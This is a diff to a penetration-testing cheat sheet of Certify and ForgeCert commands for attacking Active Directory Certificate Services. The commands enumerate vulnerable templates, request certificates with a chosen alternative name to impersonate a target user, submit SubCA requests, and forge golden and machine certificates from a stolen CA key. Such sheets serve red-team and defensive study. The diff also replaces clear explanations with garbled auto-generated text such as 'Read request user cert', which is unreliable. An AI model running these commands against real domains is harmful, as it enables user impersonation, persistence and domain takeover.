@@ -4,36 +4,36 @@
 
 ### Find vulnerable templates
 
-Enumerate AD CS templates and highlight vulnerable configurations.
+Find vulnerable templates with Certify / ForgeCert.
 
-```powershell title:"Find vulnerable AD CS templates"
+```powershell title:"Certify / ForgeCert Find Vulnerable Templates"
 .\Certify.exe find /vulnerable /enabled
 ```
 <!-- cheat -->
 
 ### Find templates and ACLs
 
-Enumerate templates, CAs, enrollment permissions, and relevant ACLs.
+Find templates and ACLs with Certify / ForgeCert.
 
-```powershell title:"Enumerate templates and ACLs"
+```powershell title:"Certify / ForgeCert Find Templates and ACLs"
 .\Certify.exe find
 ```
 <!-- cheat -->
 
 ### Enumerate CAs
 
-List enterprise CAs and web enrollment endpoints.
+Enumerate CAs with Certify / ForgeCert.
 
-```powershell title:"Enumerate enterprise CAs"
+```powershell title:"Certify / ForgeCert Enumerate CAs"
 .\Certify.exe cas
 ```
 <!-- cheat -->
 
 ### Enumerate web enrollment
 
-Check CA web enrollment exposure for ESC8-style relay paths.
+Enumerate web enrollment with Certify / ForgeCert.
 
-```powershell title:"Find web enrollment endpoints"
+```powershell title:"Certify / ForgeCert Enumerate Web Enrollment"
 .\Certify.exe cas /enrolleeSuppliesSubject
 ```
 <!-- cheat -->
@@ -42,9 +42,9 @@ Check CA web enrollment exposure for ESC8-style relay paths.
 
 ### Request cert with SAN
 
-Request a certificate from a template that allows enrollee-supplied subject alternative names.
+Run request cert with SAN with Certify / ForgeCert.
 
-```powershell title:"Request cert with chosen SAN"
+```powershell title:"Certify / ForgeCert Run Request Cert with SAN"
 .\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"$target_user"
 ```
 <!-- cheat
@@ -56,9 +56,9 @@ var target_user
 
 ### Request User cert
 
-Request a normal User template certificate for the current context.
+Read request user cert with Certify / ForgeCert.
 
-```powershell title:"Request User template certificate"
+```powershell title:"Certify / ForgeCert Read Request User Cert"
 .\Certify.exe request /ca:"$domain\$ca_name" /template:"User"
 ```
 <!-- cheat
@@ -68,9 +68,9 @@ var ca_name
 
 ### Request SubCA cert
 
-Submit a SubCA request. This often pends; pair with ManageCA/ManageCertificates rights to approve and retrieve it.
+Read request SubCA cert with Certify / ForgeCert.
 
-```powershell title:"Submit SubCA certificate request"
+```powershell title:"Certify / ForgeCert Read Request SubCA Cert"
 .\Certify.exe request /ca:"$ca_fqdn\$ca_name" /template:SubCA /altname:"$target_user"
 ```
 <!-- cheat
@@ -81,9 +81,9 @@ var target_user
 
 ### Download issued request
 
-Download a certificate by request ID after approval.
+Download issued request with Certify / ForgeCert.
 
-```powershell title:"Download issued certificate request"
+```powershell title:"Certify / ForgeCert Download Issued Request"
 .\Certify.exe download /ca:"$ca_fqdn\$ca_name" /id:$request_id
 ```
 <!-- cheat
@@ -96,9 +96,9 @@ var request_id
 
 ### Forge golden certificate
 
-Forge a certificate signed by a stolen CA private key. Use the resulting PFX with PKINIT tooling such as Rubeus or Certipy.
+Read forge golden certificate with Certify / ForgeCert.
 
-```powershell title:"Forge certificate from stolen CA PFX"
+```powershell title:"Certify / ForgeCert Read Forge Golden Certificate"
 .\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$target_user" --SubjectAltName "$target_upn" --NewCertPath "$new_pfx" --NewCertPassword "$new_pfx_pass"
 ```
 <!-- cheat
@@ -112,9 +112,9 @@ var new_pfx_pass
 
 ### Forge machine certificate
 
-Forge a certificate for a machine principal.
+Read forge machine certificate with Certify / ForgeCert.
 
-```powershell title:"Forge machine certificate"
+```powershell title:"Certify / ForgeCert Read Forge Machine Certificate"
 .\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$computer_name" --SubjectAltName "$computer_name@$domain" --NewCertPath "$new_pfx" --NewCertPassword "$new_pfx_pass"
 ```
 <!-- cheat
